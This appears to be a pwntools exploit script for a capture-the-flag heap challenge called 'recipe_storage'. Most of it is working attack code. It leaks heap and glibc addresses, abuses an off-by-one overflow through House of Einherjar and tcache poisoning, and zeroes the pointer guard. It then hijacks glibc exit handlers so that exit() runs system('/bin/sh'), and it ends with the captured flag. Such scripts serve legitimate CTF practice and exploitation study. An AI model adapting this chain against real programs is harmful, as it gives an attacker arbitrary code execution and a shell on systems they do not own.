from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./recipe_storage_patched', '''
    b *create_recipe
    b *delete_recipe
    b *print_recipe
    b *edit_recipe
    continue
''')

# p = remote('recipe-storage.challs.brunnerne.xyz', 31000)

def create_recipe(size, index, data):
    # malloc a chunk of size (0-0x2000) at index (0-0xf) and fill it with size bytes of data at most
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(size).encode())
    p.sendlineafter(b"> ", str(index).encode())
    p.sendafter(b"> ", data)

def delete_recipe(index):
    # free a chunk at index (0-0xf) and set its pointer to null
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def print_recipe(index):
    # for a chunk at index (0-0xf), view its data as a string and print it out
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(index).encode())
    return p.recvuntil(b"\nWhat would you like to do?\n", drop=True)

def edit_recipe(index, data):
    # for a chunk at index (0-0xf), view its data as a string, get its string length, and fill it with length bytes of data at most (off-by-bytes overflow)
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"> ", str(index).encode())
    p.sendafter(b"> ", data)

def exit():
    # call exit(0) to exit program
    p.sendlineafter(b"> ", b'5')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted

# Stage 1: leak heap base address and glibc base address
create_recipe(0x5f8, 0, b'0'*0x5f8)  # 0x600 at heap_base_addr+0x290
create_recipe(0xf8, 6, b'6'*0xf8)  # 0x100 at heap_base_addr+0x890
delete_recipe(0)
create_recipe(0xf8, 0, b'0'*0x10)  # 0x100 at heap_base_addr+0x290
heap_base_addr = u64(print_recipe(0)[-6:].ljust(8, b'\x00'))-0x290
log.info(f"heap base addr: {hex(heap_base_addr)}")
create_recipe(0xf8, 1, b'1'*0x8)  # 0x100 at heap_base_addr+0x390
glibc_base_addr = u64(print_recipe(1)[-6:].ljust(8, b'\x00'))-0x203b20
log.info(f"glibc base addr: {hex(glibc_base_addr)}")
create_recipe(0xf8, 2, b'2'*0xf8)  # 0x100 at heap_base_addr+0x490
create_recipe(0xf8, 3, b'3'*0xf8)  # 0x100 at heap_base_addr+0x590
create_recipe(0xf8, 4, b'4'*0xf8)  # 0x100 at heap_base_addr+0x690
create_recipe(0xf8, 5, b'5'*0xf8)  # 0x100 at heap_base_addr+0x790
# chunks of size 0x100 from index 0 to 6 are malloced and next to each other sequentially from heap_base_addr+0x290 to heap_base_addr+0x890

# Stage 2: house of einherjar for tcache poisoning to abuse exit handlers and bypass pointer mangle
# prepare fake chunk of size 0x140 at heap_base_addr+0x9b0 for house of einherjar in chunk at heap_base_addr+0x9a0
create_recipe(0x28, 7, p64(0)+p64(0x140)+p64(heap_base_addr+0x9a0)*2+b'7'*0x8)  # 0x30 at heap_base_addr+0x9a0
# prepare for tcache poisoning later
create_recipe(0x38, 8, b'8'*0x38)  # 0x40 at heap_base_addr+0x9d0
create_recipe(0x38, 9, b'9'*0x38)  # 0x40 at heap_base_addr+0xa10
# prepare for tcache poisoning later
create_recipe(0x48, 10, b'a'*0x48)  # 0x50 at heap_base_addr+0xa50
create_recipe(0x48, 11, b'b'*0x48)  # 0x50 at heap_base_addr+0xaa0
# target chunk for house of einherjar
create_recipe(0xf8, 12, b'c'*0xf8)  # 0x100 at heap_base_addr+0xaf0
# avoid malloc consolidation
create_recipe(0x18, 13, b'd'*0x18)  # 0x20 at heap_base_addr+0xbf0
# overflow to overwrite prev_size and size of target chunk at heap_base_addr+0xaf0 with 0x140 (fake chunk size) and 0x100 respectively to pass check of house of einherjar
edit_recipe(11, b'b'*0x40+p64(0x140)+p16(0x100))
# free 7 chunks of size 0x100 from index 0 to 6 to fill tcache bins
for i in range(7):
    delete_recipe(i)
# free chunk at heap_base_addr+0xaf0 to trigger house of einherjar, a chunk of size 0x240 (0x140+0x100) starting from fake chunk at heap_base_addr+0x9b0 is freed into unsorted bin
delete_recipe(12)
# prepare for tcache poisoning later
delete_recipe(9)
delete_recipe(8)
# prepare for tcache poisoning later
delete_recipe(11)
delete_recipe(10)
# make tcache bin of size 0x40 looks like heap_base_addr+0x9d0 -> pointer_guard_addr; make tcache bin of size 0x50 looks like heap_base_addr+0xa50 -> initial_addr
pointer_guard_addr = glibc_base_addr-0x28c0+0x30
initial_addr = glibc_base_addr+0x204fc0
create_recipe(0x238, 14, p64(0)*3+p64(0x41)+p64(((heap_base_addr+0x9d0)>>12)^(pointer_guard_addr))+p64(0)*6+p64(0x41)+p64(heap_base_addr>>12)+p64(0)*6+p64(0x51)+p64(((heap_base_addr+0xa50)>>12)^(initial_addr)))
glibc_e = ELF('./libc.so.6')
# perform tcache poisoning to overwrite pointer guard in tls with 0
create_recipe(0x38, 0, b'0'*0x38)
create_recipe(0x38, 1, p64(0))
# prepare for tcache poisoning to write encrypted address of system in glibc to initial+24 and address of "/bin/sh\x00" string in glibc to initial+32
create_recipe(0x48, 2, b'2'*0x48)
create_recipe(0x48, 3, p64(0)+p64(1)+p64(4)+p64(pointer_guard_encrypt(glibc_base_addr+glibc_e.sym.system, 0))+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))))
# call exit(0) to trigger system("/bin/sh\x00")
exit()

p.interactive()

# brunner{0h_n0_th3_0ff_by3_0n3_r3cip3}